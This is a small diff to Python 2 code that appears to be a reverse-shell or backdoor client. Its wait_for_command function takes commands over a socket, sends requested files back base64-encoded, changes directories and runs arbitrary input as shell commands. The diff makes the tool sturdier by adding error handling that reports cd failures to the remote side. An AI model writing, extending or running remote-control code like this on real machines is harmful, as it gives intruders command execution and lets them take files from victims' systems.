@@ -66,8 +66,13 @@ def wait_for_command(s):
             s.send("BEGIN: " + data_arr[i] + "\n")
             s.send(base64.encodestring(fdata))
             s.send("END: " + data_arr[i] + "\n")
+        return False
     elif (len(data_arr) > 1) and (data_arr[0] == "cd"):
-        os.chdir(data_arr[1])
+        try:
+            os.chdir(data_arr[1])
+        except Exception, cde:
+            s.send(str(cde) + "\n")
+            return False
     else:
         # do shell command
         proc = subprocess.Popen(data, shell=True,
